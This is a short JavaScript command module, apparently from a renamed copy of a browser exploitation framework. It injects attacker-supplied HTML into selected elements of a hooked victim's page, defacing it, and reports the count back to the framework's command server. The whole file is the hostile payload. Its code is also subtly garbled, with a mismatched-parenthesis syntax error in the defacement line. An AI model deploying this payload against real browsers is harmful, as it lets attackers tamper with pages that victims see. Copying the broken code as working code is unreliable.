//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var result = $j('<%= @deface_selector %>').each(function() {
		$j(this).html(decodeURIComponent(server.encode.base64.decode('<%= Base64.strict_encode64(@deface_content) %>')););
	}).length;

    server.net.send("<%= @command_url %>", <%= @command_id %>, "result=Defaced "+ result +" elements", server.are.status_success());
});
